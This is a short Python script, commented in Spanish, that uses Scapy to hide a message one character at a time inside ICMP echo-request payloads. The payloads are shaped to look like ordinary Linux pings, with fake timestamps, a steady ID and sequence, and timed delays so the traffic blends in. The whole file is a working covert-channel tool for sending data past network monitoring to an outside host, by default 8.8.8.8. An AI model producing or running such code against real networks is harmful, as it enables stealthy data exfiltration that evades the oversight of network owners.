import sys
import time
from scapy.all import IP, ICMP, send

def send_stealth_ping(mensaje, destino="8.8.8.8"):
    # Payload base que simula el padding de un ping estandar de Linux (bytes 10 a 37 en hex)
    payload_base = bytes.fromhex("101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637")
    
    identificador = 54321 # Simulamos un ID de proceso estático para la sesión
    secuencia = 1 # Iniciamos la secuencia en 1 para que sea coherente y aumente

    for char in mensaje:
        # Simulamos los 8 bytes iniciales que usualmente son un timestamp
        timestamp_falso = b'\x62\x60\x09\x00\x00\x00\x00\x00' 
        
        # Ocultamos el carácter en el índice 8 (noveno byte) e inyectamos el resto del padding
        payload = timestamp_falso + char.encode() + payload_base[1:]
        
        # Armamos el paquete agregando el ID y la Secuencia en la cabecera ICMP
        packet = IP(dst=destino)/ICMP(type=8, id=identificador, seq=secuencia)/payload
        
        # Enviamos el paquete de forma silenciosa
        send(packet, verbose=False)
        print(f"Sent 1 packets. (Seq={secuencia})")
        
        secuencia += 1 # Aumentamos la secuencia para el próximo paquete
        time.sleep(1) # Delay para evitar flood y simular comportamiento humano

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: sudo python3 pingv4.py \"mensaje_cifrado\"")
        sys.exit(1)

    mensaje_cifrado = sys.argv[1]
    send_stealth_ping(mensaje_cifrado)
